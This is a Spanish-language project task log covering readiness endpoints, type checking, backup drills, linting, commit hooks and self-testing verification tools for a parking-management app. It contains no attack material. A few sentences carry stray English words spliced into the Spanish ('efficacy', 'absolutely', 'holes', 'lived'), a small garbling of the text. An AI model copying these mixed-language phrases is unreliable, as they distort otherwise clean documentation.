  - [x] El test **detecta el defecto**: ejecutado contra el código anterior, fallan 3 de los 6 (con la corrección, pasan los 6).
  - [x] Un test comprueba que **cada** `template_kind` tiene su fichero de plantilla en disco, para que añadir un tipo sin plantilla no falle en runtime.
  - [x] La suite completa sigue en verde.

### T-27 · P2 — `/health` decía "ok" con la base de datos o Redis caídos

- **Estado**: **completado** — endpoint de readiness nuevo y healthcheck del contenedor corregido
- **Contexto**: tampoco estaba en el plan. Salió al usar `tools/verificar_despliegue_limpio.py`: la app arrancaba, `/health` respondía 200 y el script daba por hecho que todo estaba bien; a continuación el login y `/parkings` devolvían **401 con *"Servicio de autenticación no disponible"***. La causa: **Redis no era alcanzable** desde donde corría el script.
- **El hueco**: `GET /health` devolvía `{"status": "ok"}` **sin comprobar nada**. O sea:
  - con la **base de datos** caída, el contenedor se declaraba sano y todo endpoint que tocara la base devolvía 500;
  - con **Redis** caído, el `AuditMiddleware` va a *fail-closed* (es lo correcto: si no se puede consultar la blacklist de tokens, no se deja pasar ningún token) y **toda** petición autenticada devolvía 401. El contenedor, en ambos casos, decía "healthy" y el operador no tenía ni una pista.
- **El arreglo**: la distinción estándar entre *liveness* y *readiness*.
  - `GET /health` → **liveness**: ¿el proceso vive? Siempre 200. A propósito **no** comprueba dependencias: un health check que dependa de la base reinicia el proceso cuando una dependencia falla, y eso convierte un fallo de red en un bucle de reinicios.
  - `GET /health/ready` → **readiness** (nuevo): comprueba de verdad la base de datos (`SELECT 1`) y Redis (`PING`) y responde **503** con el detalle de cuál falla si alguna no responde.
  - El `HEALTHCHECK` del `Dockerfile` pasa a usar `/health/ready`, así que `docker compose ps` deja de mentir. Nada depende de `condition: service_healthy` del backend, así que esto no puede crear bucles de reinicio.
  - `tools/verificar_despliegue_limpio.py` espera a `/health/ready` (no a `/health`), **aborta en cuanto recibe un 503** en vez de esperar al timeout, y explica que un 401 *"Servicio de autenticación no disponible"* es un fallo de servicio (Redis), no de credenciales.
- **Criterios de aceptación**:
  - [x] `GET /health/ready` devuelve 200 con `dependencies` cuando todo responde, y **503** con el detalle cuando algo falla.
  - [x] `GET /health` sigue siendo liveness (200 siempre) y no mira dependencias.
  - [x] `backend/tests/test_health_ready.py` (8 tests) cubre los dos endpoints y los dos casos de fallo.
  - [x] El `HEALTHCHECK` del `Dockerfile` usa `/health/ready`.
  - [x] `tools/verificar_despliegue_limpio.py` falla **rápido** y con el diagnóstico (verificado con Redis caído: `{"database":"ok","redis":"TimeoutError"}`).
  - [x] El inventario de la API se regenera: **101 rutas** (coincide con el código) y el documento incluye la nueva.
  - [x] La suite completa sigue en verde.

### T-28 · P2 — `mypy` en modo `strict`: de 77 errores a 0, y la puerta del CI deja de tolerarlos

- **Estado**: **completado** — `mypy app` sale con *"no issues found in 107 source files"*
- **Contexto**: el backend estaba en modo `strict` (`[tool.mypy] strict = true`) y el paso del CI llevaba `continue-on-error: true` **desde el primer commit** (*"MVP: todavía hay pocos stubs"*). O sea: 77 errores que nadie miraba, porque el paso que los mostraba era el único que la CI se saltaba. Con el CI remoto muerto desde el 2026-07-07, además, su salida no la leía nadie.
- **Qué se hizo** (32 ficheros, +131/−87):
  - **21 anotaciones que faltaban** (`no-untyped-def`): tipos de retorno y de parámetro.
  - **11 tipos genéricos sin parámetros** (`type-arg`): `dict` → `dict[str, Any]`, `Callable` → `Callable[..., Any]`.
  - **11 `no-any-return`**: `cast(...)` donde la librería no está tipada (passlib, pyjwt, httpx, SQLAlchemy).
  - **14 errores de redis-py**: `Awaitable[Any] | Any` en los tipos de la clase `Redis` (que sirve para el cliente síncrono y el asíncrono). Con `cast(int, ...)` se documenta que el cliente **es síncrono** y el valor **es un int**.
  - **5 decoradores de Celery** sin tipar (`# type: ignore[untyped-decorator]`).
  - **Código muerto eliminado**: el `_ = Ticket` / `_ = Vehicle` del final de `pdf.py` (los imports se usaban de verdad, así que el truco no servía para nada).
  - **Un import en el sitio equivocado**: `UserRole` venía de `app.models.user` (que no lo exporta) y ahora viene de `app.models.enums`, que es donde vive.
  - **`desc(col)` → `col.desc()`** en `api/v1/alerts.py`: en runtime es lo mismo, pero el tipo que devuelve la función no encaja en la firma de `order_by` de SQLAlchemy 2.x.
- **El hallazgo que casi se lleva por delante**: al anotar `request: Request | None = None` en `api/v1/auth.py`, **FastAPI deja de inyectar la request** (sólo lo hace cuando el tipo es exactamente `Request`; con la unión, la toma por un parámetro del cuerpo y el endpoint se rompe). La anotación se dejó como `Request = None` con un `# type: ignore[assignment]` y un comentario que explica por qué. **Un type-checker puede romper la API si se le hace caso sin leer lo que hace el framework.**
- **Criterios de aceptación**:
  - [x] `mypy app` → **0 errores** en modo `strict`.
  - [x] Verde **en los dos entornos**: Python 3.11 (la del CI, con mypy 1.20.2) y Python 3.13 (el del host). El resultado de mypy **depende de la versión** (con 1.20.2 en 3.11 aparecía un error de `order_by` que el host no reportaba), así que se comprobó en los dos.
  - [x] `ruff check app tests` → sin errores.
  - [x] La suite completa sigue en verde: **587 passed** en SQLite y **596** en PostgreSQL.
  - [x] El paso del CI **deja de tolerar** los fallos de mypy (`continue-on-error` fuera), validado con el job replicado en local.
  - [x] `actionlint` exit 0.
- **Qué NO se ha tocado**: la lógica. Todos los cambios son anotaciones, `cast` y dos correcciones de import. El único cambio de comportamiento posible (el `response_model` implícito de `api/v1/incidents.py` al anotar su retorno) lo cubre la suite.

### T-29 · P2 — el simulacro de restauración de backups, automatizado

- **Estado**: **completado** — `python tools/verificar_backup.py` → *SIMULACRO CORRECTO* en 10 s
- **Contexto**: T-12 entregó el `backup.sh`, el `restore.sh` y la retención GFS, y probó la restauración **a mano**. Pero la decisión **D3** fija que el procedimiento se prueba **cada trimestre**, y ese "cada trimestre" era una **checklist en papel** que alguien repasaba y anotaba en un ticket. Entre trimestre y trimestre, un backup roto (passphrase perdida, destino remoto caído, disco lleno) pasaba **meses** sin que nadie se enterara. Y la regla del propio plan es tajante: *"un backup sin restaurar probado no es un backup"*.
- **Qué se ha automatizado** (`tools/verificar_backup.py` + `infra/backup/simulacro.sh`), encadenando lo que ya existía:
  1. `backup.sh` → un volcado cifrado nuevo.
  2. El `.enc` **no es legible en claro** (si `head -c 16` dice `PGDMP`, el backup no está cifrado).
  3. `restore.sh` → restauración en una base limpia, con su verificación.
  4. **El recuento de filas coincide** entre el origen y la restauración (8 tablas).
  5. **`alembic check` contra la base restaurada**: el esquema del backup tiene que ser **el que espera el código de hoy**.
  6. El **backend arranca** contra la base restaurada y `/health` da 200.
  7. Se borra la base de prueba.
- **El paso 5 es el que de verdad duele**: un backup de hace tres meses, restaurado, y la app no arranca porque le falta una columna. Con el simulacro automatizado eso se ve en el momento, no en el trimestre.
- **Por qué corre dentro de un contenedor**: el host no tiene `pg_dump`, `pg_restore` ni `openssl`, y el `pg_dump` tiene que ser **de la misma versión que el servidor** (si no, `pg_restore` falla con *"unsupported version"*). Por eso corre en `postgis/postgis:16-3.4` —la imagen del servidor— dentro de la red de Docker.
- **Lo que el simulacro automático NO sustituye**: la checklist manual sigue siendo obligatoria, porque el automático comprueba que la **cadena** funciona, y el manual comprueba lo que la cadena no puede (que el destino S3 remoto está bien, que la passphrase real está en el gestor de secretos, que hay una persona responsable). Las dos conviven en `infra/backup/README.md`.
- **Criterios de aceptación**:
  - [x] El simulacro completo pasa: **SIMULACRO CORRECTO en 10 s**.
  - [x] El volcado se comprueba cifrado (no legible en claro).
  - [x] La base restaurada tiene **los mismos recuentos** que la original.
  - [x] `alembic check` verde contra la base restaurada.
  - [x] El backend arranca contra ella y `/health` da 200.
  - [x] La base de prueba se borra al terminar.
  - [x] Entra en la puerta del repo: `python tools/verificar_repo.py` lo comprueba en el modo rápido.
  - [x] La checklist manual sigue documentada (no se elimina el simulacro trimestral en papel).

### T-30 · P2 — el linter del frontend no existía (el script estaba roto y el CI no lo ejecutaba)

- **Estado**: **completado** — `npm run lint` sale con **0 problemas** y es una puerta del CI
- **Contexto**: el `package.json` del frontend definía un script `lint` (`eslint --ext .ts,.vue src`) que **nunca funcionó**: ESLint 9 exige un `eslint.config.js` (config plano) y **en el repo no había ninguno**. Y el job `frontend` del CI **no ejecutaba el linter**, así que el script roto pasó desapercibido. El backend sí tenía linter (`ruff`) desde el principio: la asimetría era de origen, no de decisión.
- **Qué se ha hecho**:
  - `frontend/eslint.config.js`: configuración plana con `js.configs.recommended` + `pluginVue.configs['flat/essential']` + `vueTsConfigs.recommended`.
  - Se usa **`flat/essential`**, no `flat/recommended`: "recommended" arrastra reglas de **formato** (una etiqueta por línea, un atributo por línea) que son opinión y que obligarían a reformatear el frontend entero (1 425 avisos). Con "essential" el linter avisa de lo que está **mal**, no de lo que está escrito de otra manera.
  - Se añade el paso **"Linter (eslint)"** al job `frontend` del CI, validado con el job replicado en local: *"El job 'frontend' pasa entero en local"*.
- **Lo que el linter encontró al activarlo (5 errores + 1 aviso, todos reales)**:
  - `api/gestorOps.ts`: el parámetro `labels` de `filterMovements` **no se usaba** dentro de la función (el caller lo pasaba). Código muerto: se quitó el parámetro y el argumento.
  - `views/gestor/MovementsView.vue`: `const ui = useUiStore()` **sin usar** (ni en el script ni en la plantilla). Restos de una iteración anterior: se quitó el import y la constante.
  - `views/gestor/CalibrateView.vue`: un `// eslint-disable-next-line no-console` **obsoleto** (la regla no se disparaba): se quitó.
  - `env.d.ts`: el shim estándar de Vue (`DefineComponent<{}, {}, any>`) dispara la regla de "objeto vacío". Se apaga **sólo** en `*.d.ts`, con un comentario que explica por qué.
- **Criterios de aceptación**:
  - [x] `npm run lint` → **0 problemas** (0 errores, 0 avisos).
  - [x] `vue-tsc --noEmit` → 0 errores (sigue en verde tras tocar los ficheros).
  - [x] El paso "Linter (eslint)" está en el job `frontend` del CI y el job replicado en local pasa entero.
  - [x] `actionlint` exit 0.
  - [x] La QA visual sigue en verde (21 pantallas × 5 anchos, 0 desbordes) tras tocar `MovementsView.vue` y `CalibrateView.vue`.
  - [x] La configuración usa `flat/essential`: el linter no exige reformatear el código.

### T-31 · P2 — hook de commit: el texto corrupto no vuelve a entrar por la puerta de atrás

- **Estado**: **completado** — probado en los dos sentidos (bloquea lo sucio, deja pasar lo limpio)
- **Contexto**: el escáner de texto es un paso del CI desde T-13+10, pero **el CI no corre en este repositorio** (la facturación de la cuenta lo bloquea desde el 2026-07-07). Es decir: la puerta contra la corrupción de texto llevaba días sin efficacy. Y la corrupción había llegado al commit **cuatro veces en un solo día**; una de ellas tocó un identificador de JavaScript y dejó una vista en blanco con un 500.
- **Qué se ha hecho**: `.githooks/pre-commit` escanea **los ficheros que se van a versionar** y rechaza el commit si detecta texto corrupto, indicando fichero, línea y carácter sospechoso.
  - Se filtra por **extensión** antes de escanear: el escáner da un falso positivo con un binario (un PNG no es UTF-8 válido) y eso bloquearía commits de imágenes legítimas.
  - El detalle se lee del **informe UTF-8** que deja el escáner, no de su salida por consola (que en Windows se come los acentos).
- **Cómo se activa** (una vez por clon): `git config core.hooksPath .githooks`. Está documentado en el README raíz y en `tools/README.md`. Para saltarlo: `git commit --no-verify`.
- **Criterios de aceptación**:
  - [x] Con un fichero corrupto en el índice, el commit **se rechaza** (código 1) con el fichero, la línea y el carácter señalados.
  - [x] Con un fichero limpio, el commit **pasa** (código 0).
  - [x] Los ficheros binarios no bloquean el commit.
  - [x] Documentado cómo activarlo en los dos README.

### T-32 · P1 — los scripts de backup no eran ejecutables: en Linux no habría backups

- **Estado**: **completado** — los tres scripts versionados con modo `100755`
- **Contexto**: tampoco estaba en el plan, y salió al mirar los modos en el índice de git al añadir el hook de commit. Los tres scripts de `infra/backup/` (`backup.sh`, `restore.sh` y el nuevo `simulacro.sh`) estaban versionados con modo **100644** (sin bit de ejecución).
- **Por qué es un P1**: el procedimiento documentado los invoca **directamente**:
  - el `cron` de backups: `17 3 * * * root ... /opt/solidapp/infra/backup/backup.sh >> ...` → **`Permission denied`** en un despliegue Linux;
  - la restauración: `./restore.sh --file ... --target-db ...` → ídem.
  Es decir: **en un despliegue real en Linux no se habría hecho ni un solo backup**, y el único indicio sería la alerta de "no hay ningún backup". En el entorno de desarrollo (Docker, `sh script.sh`) no se nota, por eso pasó inadvertido.
- **El arreglo**: `git update-index --chmod=+x` para los tres scripts (es el modo del **índice** el que viaja al clon; en Windows el bit local no se conserva porque `core.filemode` es `false`).
- **Criterios de aceptación**:
  - [x] `git ls-files -s` muestra los tres scripts con modo `100755`.
  - [x] No hay más scripts `.sh` en el repo con el modo equivocado (comprobado: son los tres).

### T-33 · P2 — cuatro servicios sin healthcheck: el stack nunca aparecía "todo healthy"

- **Estado**: **completado** — los **11 servicios** del stack aparecen `(healthy)`
- **Contexto**: la definición de hecho del plan dice *"docker compose up -d → **todos los servicios healthy**"*, pero `docker compose ps` mostraba el frontend, Loki, promtail y Grafana **sin** estado de salud: esos cuatro servicios **no tenían healthcheck**. O sea que el criterio se daba por cumplido sin que nada lo comprobara.
- **Qué se ha añadido** (y por qué cada probe es el que es):

  | Servicio | Probe | Motivo |
  |---|---|---|
  | `frontend` | `wget http://127.0.0.1:5173/` | El dev-server de Vite *es* la app. La imagen es `node:20-alpine`: `wget` de busybox, no `curl` |
  | `loki` | `wget http://127.0.0.1:3100/metrics` | **El `/ready` de Loki devuelve 503 aunque esté perfectamente en pie**, así que no sirve. `/metrics` responde 200 mientras el servidor HTTP esté vivo, que es lo que debe comprobar un healthcheck |
  | `promtail` | `grep -q promtail /proc/1/comm` | Promtail no expone endpoint HTTP (empuja logs) y su imagen **no trae `wget` ni `pgrep`**. Lo comprobable es que el proceso del contenedor siga siendo el promtail |
  | `grafana` | `wget http://127.0.0.1:3000/api/health` | Responde 200 con el estado de su base de datos |

- **Criterios de aceptación**:
  - [x] `docker compose config` sigue siendo válido.
  - [x] `docker compose up -d` levanta el stack y **los 11 servicios aparecen `(healthy)`**.
  - [x] La app sigue funcionando tras recrear los contenedores (QA visual en verde).

### T-34 · P2 — auditoría de la "definición de hecho": cifras obsoletas y una deriva silenciosa

- **Estado**: **completado** — todas las cifras contrastadas con comandos reales
- **Contexto**: la definición de hecho del plan es el contrato del trabajo, y varios de sus números se habían quedado obsoletos (o no se habían comprobado nunca con el rigor que la propia definición exigía).
- **Lo que salió al auditarla, criterio por criterio**:
  - **Deriva silenciosa**: `docs/API-INTERNAL.md` decía *"100 endpoints"* cuando ya eran **101**. La causa: el número de endpoints de salud estaba **duplicado** en dos herramientas (`verificar_api_doc.py` los sumaba a mano; `generar_seccion_api.py` sumaba `+1` por `/health`), así que al añadir `/health/ready` (T-27) el generador siguió contando uno. **Ahora la lista vive en un solo sitio** (`extraer_api.RUTAS_FUERA_DE_ROUTER`) y las dos herramientas la importan. Comprobado que el aviso funciona: con el generador arreglado, el verificador detectó la deriva (documento=100, código=101) y falló con código 1; tras regenerar, vuelve a pasar, y la autoprueba sigue detectando las dos caras.
  - **Cifras obsoletas**: "530 tests" y "100 endpoints" en el README, "22 routers" en el CODEMAP (son 24), "548/557 passed" en la definición de hecho (ahora 566/575) y un "10 pantallas" que ya se había corregido a 6 en otro sitio del mismo documento.
  - **Criterios que se daban por cumplidos sin comprobar**: *"todos los servicios healthy"* → **faltaban cuatro healthcheck** (T-33) y *"sin 4xx/5xx en el log del backend"* → comprobado ahora contra el log real (145 líneas en 30 min, cero 4xx/5xx).
- **Criterios de aceptación**:
  - [x] Todas las cifras de la documentación contrastadas con comandos reales: **101 endpoints** (en 24 routers), **19 modelos**, **565 tests**, **11 servicios healthy**.
  - [x] La lista de rutas fuera de los routers tiene **una sola fuente** (`extraer_api.RUTAS_FUERA_DE_ROUTER`).
  - [x] El verificador de la API **detecta** la deriva en la prosa (probado: falla con código 1 si el documento no se regenera).
  - [x] La autoprueba del verificador sigue en verde.

### T-35 · P1 — el inventario de la API documentaba como "Público" 9 endpoints que exigen admin

- **Estado**: **completado** — el RBAC del documento coincide con el código
- **Contexto**: auditando la columna **"Quién"** de `docs/API-INTERNAL.md` (el contrato que lee quien integra la API) contra el código, los 9 endpoints de `/plans` aparecían como **"Público"**: el catálogo de planes, el alta y el borrado de planes, las suscripciones y "mi plan". En el código, **todos exigen autenticación** y casi todos son **de admin**.
- **Por qué pasaba**: `tools/extraer_api.py` sacaba las dependencias de FastAPI **sólo del valor por defecto** del parámetro (`x: User = Depends(...)`). El idioma moderno es **en la anotación** (`x: Annotated[User, Depends(require_role(...))]`), y ese camino no se miraba. Encima, el bucle de los posicionales recorría únicamente los parámetros **que tenían valor por defecto**, así que los que llevan la dependencia en la anotación ni siquiera se visitaban.
- **Por qué nadie lo vio**: el verificador (`tools/verificar_api_doc.py`) compara el **conjunto de rutas**, que no había cambiado: 9 endpoints "Público" y 9 endpoints con el RBAC correcto dan el mismo juego de rutas. La deriva estaba en la **columna**, y nadie la miraba porque el gate no la cubría.
- **El arreglo**:
  - `extraer_api.py` mira **las dos** formas (valor por defecto **y** anotación `Annotated[...]`), y recorre **todos** los parámetros, no sólo los que tienen default.
  - `verificar_api_doc.py --autoprueba` tiene ahora una **tercera** cara: cambiar el "Quién" de una fila debe detectarse. Antes sólo comprobaba que se detectara añadir y quitar rutas.
- **Criterios de aceptación**:
  - [x] Los 9 endpoints de `/plans` documentan su RBAC real (`require_role('admin')` / `require_role('admin', 'cliente')`).
  - [x] Los 7 endpoints que **sí** son públicos siguen marcándose como tal: login, login OAuth, refresh, forgot-password, reset-password y los dos de salud. Comprobado contra el código.
  - [x] La autoprueba detecta las **tres** caras de la deriva (quitar ruta, añadir ruta inexistente y cambiar el RBAC).
  - [x] El documento regenerado y el verificador en verde.

### T-36 · P1 — las puertas no tenían forma de demostrar que detectan

- **Estado**: **completado** — `python tools/autopruebas.py` → las 3 autopruebas pasan
- **Contexto**: los bugs más caros de este repositorio **no estaban en la aplicación**, sino en las **herramientas que la describen o la miden**: el extractor de RBAC que decía "Público" en 9 endpoints de admin (T-35), el script de lint del frontend que nunca funcionó (T-30), los healthcheck que no existían (T-33) y el recuento de endpoints que se quedó en 100 cuando ya eran 101 (T-34). A todos les faltaba **lo mismo**: ninguna tenía forma de **demostrar que detectaba** lo que dice detectar. Una puerta que no se puede ver fallar no es una puerta.
- **Qué se ha añadido**:
  - `tools/escanear_texto.py --autoprueba`: detecta cada clase de corrupción (CJK, cirílico, coreano, moneda rara, fichero que no es UTF-8) y **no dispara con el español normal con acentos** (que es el 99 % del repo).
  - `tools/escanear_secretos.py --autoprueba`: detecta los 5 tipos de secreto y **no dispara** con los valores de ejemplo, los ficheros exentos (`.env.example`, `tests/`, `docs/`) ni los comentarios.
  - `tools/verificar_api_doc.py --autoprueba`: ya cubría quitar y añadir rutas; se le añadió la **tercera** cara (cambiar el RBAC de una fila), que es la deriva que se coló en T-35.
  - `tools/autopruebas.py`: la **meta-puerta**, que ejecuta todas las autopruebas y falla si alguna ha dejado de detectar. Añadir una puerta nueva es añadirla a su lista.
  - Paso nuevo en el CI: *"Las puertas se prueban a sí mismas"*.
- **Criterios de aceptación**:
  - [x] `python tools/autopruebas.py` → **las 3 autopruebas pasan**.
  - [x] El escáner de secretos **no detecta sus propios fixtures**: los tokens de mentira se construyen en tiempo de ejecución, no literales en el source (el repo es público: un token literal en el código es una credencial filtrada).
  - [x] `ruff check ../tools` en verde con los cambios.
  - [x] La meta-puerta está en el CI y en `tools/verificar_repo.py`.

### T-37 · P1 — el detector de asimetrías no comparaba nada, y detrás había 5 holes vivos

- **Estado**: **completado** — detector arreglado, 5 asimetrías corregidas y test permanente
- **Contexto**: `tools/revisar_esquemas.py` es la puerta que el plan cita como la que encontró el hueco del `CameraUpdate.rtsp_url`. Al añadirle su autoprueba (T-36) salió que **esa puerta llevaba desde su creación sin comparar absolutely nada**:
  1. Buscaba la pareja con `nombre[:-5]`, pero **"Create" tiene seis letras** → la pareja se llamaba `CameraCUpdate` y no se encontraba jamás. Su "OK" era vacío.
  2. Miraba sólo el **cuerpo** de la clase, así que era ciego a los esquemas que **heredan** sus campos de una clase base (`ParkingCreate(ParkingBase)`, `UserCreate(UserBase)`).
- **Lo que encontró al arreglarlo (5 asimetrías vivas)**:

  | Esquema | Campo | En el alta | En la edición |
  |---|---|---|---|
  | `CameraUpdate.name` | `name` | 2-128 | **sin límite** |
  | `ParkingUpdate.name` | `name` | 2-255 | **sin límite** |
  | `ParkingUpdate.address` | `address` | 2-512 | **sin límite** |
  | `ParkingUpdate.city` | `city` | 2-128 | **sin límite** |
  | `UserUpdate.phone` | `phone` | máx. 32 | **sin límite** |

  Son del **mismo tipo** que el hueco del `rtsp_url` (T-25) y que el del `full_name` (T-19): el POST los rechazaba y el PATCH los aceptaba. Un PATCH podía dejar una sucursal sin nombre o un teléfono de 500 caracteres, que después invalidaba la fila al serializar.
- **El arreglo**:
  - Los 5 campos Update validan lo mismo que sus altas.
  - `tools/revisar_esquemas.py` corrige el `[:-5]` y **resuelve la herencia** (los campos heredados de una clase base del mismo módulo también se comparan).
  - **Test permanente y general**: `backend/tests/test_esquemas_simetricos.py` recorre todos los pares Create/Update de todos los esquemas y compara sus restricciones con las de pydantic. Así la regla queda cubierta por la suite, no sólo por la herramienta: si alguien añade una validación en un alta y olvida el PATCH, lo dice el CI.
- **Criterios de aceptación**:
  - [x] El detector encuentra una asimetría de mentira y no marca una pareja simétrica (autoprueba).
  - [x] El detector encuentra asimetrías **heredadas** de una clase base.
  - [x] Los esquemas reales no tienen asimetrías.
  - [x] El test general pasa, y **se ha comprobado que falla** reintroduciendo el defecto (sólo en el lado Update: el test lo canta).
  - [x] La suite completa sigue en verde.

### T-38 · P1 — el frontend y el backend no se hablaban

- **Estado**: **completado** — verificador de contrato con autoprueba y paso en el CI
- **Contexto**: el frontend habla con el backend a través de su propio cliente HTTP (`frontend/src/api/*.ts`) y el backend expone **101 rutas**. **Nada** comparaba las dos listas. La QA visual recorre 26 pantallas, pero sólo llega a los endpoints que esas pantallas tocan: una ruta mal escrita —o una ruta que el backend renombró— en un cliente que nadie abre se queda escondida hasta que un usuario la encuentra. Y el caso inverso, un endpoint con el **método equivocado**, es el más caro: no da 404, da 405 en producción.
- **El verificador** (`tools/verificar_contrato_frontend.py`) compara, de forma estática, **cada ruta que el cliente pide** con **las rutas que el backend expone**. Distingue dos fallos, porque se arreglan distinto:
  - la ruta **no existe** en el backend;
  - la ruta **existe pero con otro método**.
- **Cubre las dos formas de llamar**: las funciones de los módulos de `@/api/` (39) y las **44 llamadas escritas a mano** con `http.get(...)` dentro de las vistas. (Ampliado en T-39: la primera versión miraba sólo los módulos y dejaba fuera casi la mitad del cliente.)
- **Normalización de los dos lados**: el frontend escribe `${parkingId}` y el backend `{parking_id}`, y la query string se quita (`/alerts?type=x` y `/alerts` son la misma ruta). Sin esa normalización, las 83 llamadas darían 83 falsos positivos y la puerta no serviría para nada.
- **Criterios de aceptación**:
  - [x] El verificador encuentra una ruta que el backend no tiene, y una ruta con el método equivocado (autoprueba en las dos direcciones).
  - [x] La comparación real sale en verde: **83 llamadas** del cliente contra **101 rutas** del backend, 0 desajustes.
  - [x] Está en la meta-puerta (`tools/autopruebas.py`), que pasa de 5 a **8 autopruebas**.
  - [x] Está en `tools/verificar_repo.py` (la salud del repo en un comando) y en el CI, como paso del job `integration`.
  - [x] El workflow sigue siendo válido (`actionlint` exit 0) y el job `integration` pasa **completo** en la réplica local.

### T-39 · P1 — el guard de rol del frontend no se comparaba con el RBAC del backend

- **Estado**: **completado** — puerta nueva con autoprueba, y **2 bugs reales** corregidos
- **Contexto**: el router del frontend protege cada pantalla con `meta: { roles: [...] }` y el backend protege cada endpoint con `require_role(...)`. **Nada comparaba las dos listas.** Es el reverso exacto de T-35 (allí el inventario decía "Público" en endpoints de admin; aquí una pantalla promete un rol que el backend no concede).
- **El síntoma es silencioso y confuso**: el router deja entrar al gestor en una pantalla, la pantalla carga sus datos y el backend responde **403**. Desde el frontend no parece un problema de permisos —la ruta existe y el método es el correcto—: sólo el rol no encaja.
- **La puerta** (`tools/verificar_roles_frontend.py`) recorre las **22 pantallas con guard de rol**, sus componentes (cierre transitivo) y sus llamadas, y avisa si alguna llama a un endpoint que exige un rol que la pantalla no contempla. Cubre **las dos** formas de llamar: las funciones de los módulos de `@/api/` (39) y las **44 llamadas escritas a mano** con `http.get(...)` dentro de las vistas. Mirar sólo los módulos habría dejado fuera casi la mitad del cliente.
- **Criterios de aceptación**:
  - [x] La puerta recorre las 22 pantallas con guard y sus componentes, y resuelve **82 de 82** llamadas contra el backend.
  - [x] La autoprueba es **extremo a extremo**: inyecta una ruta de mentira que abre la pantalla de usuarios al gestor y comprueba que la puerta canta el desajuste; y que una pantalla con el rol correcto **no** lo canta.
  - [x] La puerta tiene un **guardia anti-puerta-zombie**: si no resuelve ninguna llamada, falla en vez de salir verde.
  - [x] Está en la meta-puerta (`tools/autopruebas.py`, que pasa de 8 a **9 autopruebas**), en `tools/verificar_repo.py` y en el CI.
  - [x] El repositorio real no tiene desajustes de rol.

#### Los 2 bugs que encontró (o destapó)

1. **El extractor de la API leía sólo el primer rol.** `tools/extraer_api.py` documentaba `require_role('admin')` para endpoints cuyo código pide **tres** roles (`require_role(UserRole.ADMIN.value, UserRole.GESTOR.value, UserRole.OPERADOR.value)`): leía `nodo.args[0]` y se olvidaba del resto. Consecuencia: **`docs/API-INTERNAL.md` mentía sobre 5 endpoints** — decía "sólo admin" donde el gestor y el operador sí pueden entrar. Es el mismo tipo de deriva que T-35, y por el mismo motivo (una herramienta que describe el código sin mirar el código entero).
   - Corregido en `_roles_de` (lee **todos** los argumentos) y regenerado el documento. La puerta `verificar_api_doc.py` detectó solo el cambio: 5 líneas desalineadas → regeneradas → coincide.
2. **La puerta de contrato no veía las llamadas directas.** `verificar_contrato_frontend.py` (T-38) miraba sólo los módulos de `@/api/`: las 44 llamadas escritas a mano en las vistas quedaban sin comprobar. Ampliada a los `.vue`; ahora cubre **83 llamadas** en vez de 39.

#### Una nota sobre la query string

Las dos herramientas quitan la query string antes de comparar (`/alerts?type=x` y `/alerts` son la misma ruta para el backend). Sin esa normalización, las 2 llamadas de `LiveView.vue` con query string salían como rutas inexistentes: un falso positivo que habría hecho que la puerta se desactivara por ruidosa.

### T-40 · P1 — la puerta del inventario comparaba el documento contra el extractor, y los dos mentían

- **Estado**: **completado** — autoprueba propia del extractor, verificada contra el defecto reintroducido
- **Contexto**: el bug de T-39 (el extractor leía sólo el primer rol) lived **sin que ninguna comprobación se enterara**, y el motivo es estructural: `tools/verificar_api_doc.py` compara el documento contra el **extractor**. Es decir, la puerta comparaba dos cosas que salían del **mismo código con el mismo defecto**. Cuando el extractor mentía, el documento se regeneraba con la misma mentira y la puerta daba el visto bueno: **verde sobre mentira**.
- **La lección**: dos comprobaciones que comparten la fuente de verdad no se vigilan entre sí. Para que una puerta vigile a otra, hace falta una **tercera** fuente: el caso de mentira escrito a mano.
- **La autoprueba** (`tools/extraer_api.py --autoprueba`) comprueba el extractor contra **6 casos de mentira** escritos a mano:
  1. `require_role("admin")` → un rol.
  2. `require_role(UserRole.ADMIN.value, UserRole.GESTOR.value, UserRole.OPERADOR.value)` → **tres** roles (el caso que fallaba).
  3. `require_role(UserRole.ADMIN.value, UserRole.GESTOR.value)` → dos roles.
  4. `require_role('admin', 'cliente')` → dos roles literales.
  5. `require_role(UserRole.ADMIN.value)` → un rol.
  6. `require_role(*_STAFF)` → los roles de la constante desplegada.
  
  Cada caso se monta como un router de mentira en un directorio temporal y se extrae de verdad (el fichero nunca se importa: sólo se parsea con `ast`). Además, se recorre el **código real** y se comprueba que ningún `require_role` con varios roles se queda con sólo el primero.
- **Criterios de aceptación**:
  - [x] La autoprueba detecta un rol único, varios roles con valores de enum, dos roles literales y una constante desplegada.
  - [x] Se ha comprobado que **falla** con el defecto reintroducido (3 de los 6 casos pasan a rojo), y que vuelve a verde al arreglarlo.
  - [x] Está en la meta-puerta, que pasa de 9 a **10 autopruebas**.
  - [x] El inventario sigue coincidiendo con el código (`verificar_api_doc.py` en verde).

### T-41 · P1 — la QA visual se bloqueaba a sí misma con el rate-limit de login

- **Estado**: **completado** — la QA recorre los 5 anchos con 3 inicios de sesión, y dice por qué falla un login
- **Contexto**: al intentar medir las cifras de la documentación, la QA falló en 2 de los 5 anchos con "no se pudo iniciar sesión". El mensaje no decía por qué, así que no era diagnosticable.
- **La causa (medida, no supuesta)**: `POST /auth/login` tiene un rate-limit de **10 intentos por IP cada 5 minutos** (`login_rate_limit_max_attempts=10`, `login_rate_limit_window_seconds=300`, con buckets por IP **y** por email; cuenta **todos** los intentos, los exitosos también). La QA inicia sesión **una vez por rol** (gestor, cliente, admin) → **3 inicios por ejecución**. Recorrer 5 anchos en 5 procesos son **15 inicios** → a partir del cuarto, el login devolvía **429** y la QA se quedaba sin poder revisar 2 de los 5 anchos.
  - Comprobado a mano: 12 inicios seguidos contra la API → los 9 primeros 200, el 10º ya **429**.
  - Consecuencia: **`python tools/verificar_repo.py --completo` era una puerta que fallaba por el rate limit, no por el código**. Y como el mensaje no decía "429", el diagnóstico empezaba por el sitio equivocado.
- **El arreglo (3 cosas)**:
  1. **`--anchos`**: un solo proceso recorre varios anchos. Se **inicia sesión una sola vez por rol** y para cada ancho se cambia el **viewport de la misma página** (`page.set_viewport_size`), con lo que la sesión se conserva. De 15 inicios a **3**.
  2. **El motivo del fallo de login se reporta**: `_login` devuelve `(ok, motivo)` y distingue el **429** ("límite de intentos, no es un fallo de la pantalla") de un timeout o un error de navegación.
  3. **Los manejadores de consola y de red se registran una vez por página** en vez de uno por pantalla: antes se acumulaban (26 pantallas × 5 anchos = 130 manejadores disparando a la vez).
- **Criterios de aceptación**:
  - [x] La QA recorre los **5 anchos en un solo proceso** con **3 inicios de sesión** en total.
